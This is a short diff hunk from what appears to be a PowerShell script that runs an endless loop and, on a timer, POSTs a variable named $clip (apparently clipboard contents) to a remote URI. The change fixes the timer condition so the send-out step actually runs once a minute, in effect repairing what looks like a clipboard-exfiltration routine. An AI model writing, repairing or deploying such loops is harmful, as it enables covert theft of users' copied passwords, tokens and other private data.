@@ -523,7 +523,7 @@ while($true)
     } else {
     }
 
-    if($Stopwatch2.Elapsed.Seconds -eq 60) {
+    if($Stopwatch2.Elapsed.Minutes -eq 1) {
         $Response = Invoke-WebRequest -Method Post -URI $URI -body $clip -UseBasicParsing -Timeout 5
         start-sleep 4
         $Stopwatch2.Stop()
